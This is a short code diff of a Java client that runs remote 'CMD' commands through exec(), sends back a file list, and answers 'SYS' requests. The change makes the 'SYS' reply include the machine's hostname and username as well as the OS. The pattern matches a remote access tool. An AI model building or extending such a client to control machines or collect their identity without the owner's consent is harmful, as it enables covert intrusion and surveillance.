@@ -139,7 +139,7 @@ public class Client {
                     exec(input.replace("CMD ", ""));
                 } else if (input.contains("SYS")) {
                     communicate("SYS");
-                    communicate(SYSTEMOS);
+                    communicate(SYSTEMOS + "::" + InetAddress.getLocalHost().getHostName() + "\\" + USERNAME);
                 } else if (input.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
